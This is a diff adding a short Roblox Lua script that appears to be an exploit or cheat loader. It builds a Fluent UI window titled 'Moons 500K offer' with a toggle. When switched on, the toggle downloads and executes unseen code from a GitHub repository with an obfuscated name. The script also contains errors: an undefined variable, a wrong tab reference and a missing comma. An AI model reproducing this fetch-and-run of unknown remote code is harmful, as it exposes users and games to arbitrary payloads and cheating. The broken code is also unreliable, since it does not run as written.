@@ -1,0 +1,28 @@
+local Library = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local Window = Fluent:CreateWindow({
+    Title = "Moons 500K offer" .. Fluent.Version,
+    SubTitle = "For Carson",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 460),
+    Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+    Theme = "Darker",
+    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+})
+
+local Tabs = {
+    Main = Window:AddTab({ Title = "Main", Icon = "0" }),
+}
+
+local Toggle = Tab:AddToggle("MyToggle", 
+{
+    Title = "Toggle", 
+    Description = "Toggle description",
+    Default = false
+    Callback = function(state)
+	if state then
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/0o0o0o0o0o0o0o0o0o0o0o0o/0o0o0o0o/refs/heads/main/Kk"))()
+	else
+	    print("Toggle Off")
+        end
+    end 
+})
